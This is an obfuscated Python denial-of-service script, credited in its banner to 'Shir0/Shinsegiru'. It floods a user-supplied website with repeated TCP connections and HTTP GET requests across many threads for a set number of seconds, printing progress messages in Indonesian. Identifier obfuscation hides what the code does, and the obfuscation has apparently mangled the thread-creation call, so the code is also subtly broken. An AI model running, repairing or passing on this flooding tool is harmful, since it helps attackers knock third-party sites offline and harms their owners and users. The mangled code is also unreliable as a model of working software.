IlIllIllIlIl = lambda *args, **kwargs: globals()['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'].__dict__['\x70\x72\x69\x6e\x74'](*args, **kwargs)
import socket
import threading
import time
import sys
import os
lllIlIlIlIlIlIIlll = '\n\n\n███████╗███╗░░░███╗██████╗░██╗░░██╗██╗░░░██╗\n██╔════╝████╗░████║██╔══██╗██║░░██║╚██╗░██╔╝\n█████╗░░██╔████╔██║██████╔╝███████║░╚████╔╝░\n██╔══╝░░██║╚██╔╝██║██╔═══╝░██╔══██║░░╚██╔╝░░\n███████╗██║░╚═╝░██║██║░░░░░██║░░██║░░░██║░░░\n╚══════╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░\n\nSimple DDoS Script by Shir0/Shinsegiru\nTelegram: @Shinsegiru\nVersion: 1.0\n\n'
IlIllIllIlIl(lllIlIlIlIlIlIIlll)

def lIIIIIIIIlIlIIlIIl(lIlIllIlIlIIIIlIlI, llIlIlIlIllIllIlIl, llIlllllllllllllll):
    llIIllIllIIIlIlllI = 'http'
    if lIlIllIlIlIIIIlIlI.startswith('https'):
        llIIllIllIIIlIlllI = 'https'
    lIlIllIlIlIIIIlIlI = lIlIllIlIlIIIIlIlI.replace('https://', '').replace('http://', '')
    IIlIlIIIIIlIIIlIll = socket.gethostbyname(lIlIllIlIlIIIIlIlI)
    IlIIlIllIlIIIIlIlI = 80 if llIIllIllIIIlIlllI == 'http' else 443
    IlIllIllIlIl(f'Mulai serangan DDoS ke {lIlIllIlIlIIIIlIlI} ({IIlIlIIIIIlIIIlIll}) untuk {llIlllllllllllllll} detik dengan {llIlIlIlIllIllIlIl} thread.')
    IIIIllIIllIllllIII = time.time()

    def IIIIllIlIlIlIllIIl():
        while time.time() - IIIIllIIllIllllIII < llIlllllllllllllll:
            try:
                IllIlllIIlIIIlIIII = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                IllIlllIIlIIIlIIII.connect((IIlIlIIIIIlIIIlIll, IlIIlIllIlIIIIlIlI))
                IllIlllIIlIIIlIIII.sendto(f'GET / HTTP/1.1\r\nHost: {lIlIllIlIlIIIIlIlI}\r\n\r\n'.encode(), (IIlIlIIIIIlIIIlIll, IlIIlIllIlIIIIlIlI))
                IllIlllIIlIIIlIIII.close()
            except:
                pass
    IllllllllIIlllIlIl = []
    try:
        for lIIIIlllIIlIlIllll in range(llIlIlIlIllIllIlIl):
            IIIIIIIIIIIlIIllII = threading.Thread(lIlIllIlIlIIIIlIlI=IIIIllIlIlIlIllIIl)
            IllllllllIIlllIlIl.append(IIIIIIIIIIIlIIllII)
            IIIIIIIIIIIlIIllII.start()
        while time.time() - IIIIllIIllIllllIII < llIlllllllllllllll:
            IllIIIlIlIllIIlIll = int(time.time() - IIIIllIIllIllllIII)
            IlIllIllIlIl(f'\rDurasi serangan: {IllIIIlIlIllIIlIll}/{llIlllllllllllllll} detik', end='')
            time.sleep(1)
        IlIllIllIlIl('\nSerangan selesai.')
    except KeyboardInterrupt:
        IlIllIllIlIl('\nKeyboardInterrupt: Keluar dari script.')
        os._exit(0)
    finally:
        for IIIIIIIIIIIlIIllII in IllllllllIIlllIlIl:
            IIIIIIIIIIIlIIllII.join()
if __name__ == '__main__':
    if len(sys.argv) < 4:
        IlIllIllIlIl('Penggunaan: python start.py <domain website contoh: https://domain.com> <jumlah thread. Nilai default 100> <waktu dalam detik>')
        sys.exit(1)
    lIlIllIlIlIIIIlIlI = sys.argv[1]
    llIlIlIlIllIllIlIl = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    llIlllllllllllllll = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    lIIIIIIIIlIlIIlIIl(lIlIllIlIlIIIIlIlI, llIlIlIlIllIllIlIl, llIlllllllllllllll)